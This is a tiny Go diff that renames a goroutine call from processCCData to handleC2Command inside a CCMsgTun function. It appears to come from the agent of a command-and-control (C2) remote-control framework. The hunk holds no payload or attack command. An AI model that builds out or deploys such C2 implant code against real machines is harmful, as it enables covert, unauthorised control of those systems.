@@ -187,7 +187,7 @@ func CCMsgTun(ctx context.Context, cancel context.CancelFunc) (err error) {
 			}
 
 			// process CC data
-			go processCCData(&msg)
+			go handleC2Command(&msg)
 		}
 		log.Println("Check CC response: exited")
 	}()
